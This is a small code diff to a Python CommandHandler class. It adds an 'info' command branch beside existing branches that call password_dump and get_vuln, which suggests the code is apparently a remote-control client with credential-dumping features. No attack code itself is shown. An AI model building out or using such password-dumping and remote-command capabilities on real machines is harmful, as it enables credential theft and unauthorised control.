@@ -57,4 +57,6 @@ class CommandHandler:
             self.control.password_dump(command["value"])
         elif _command == CLIENT_GET_VULN:
             self.control.get_vuln(command["value"])
+        elif _command == CLIENT_INFO:
+            self.control.info()
 
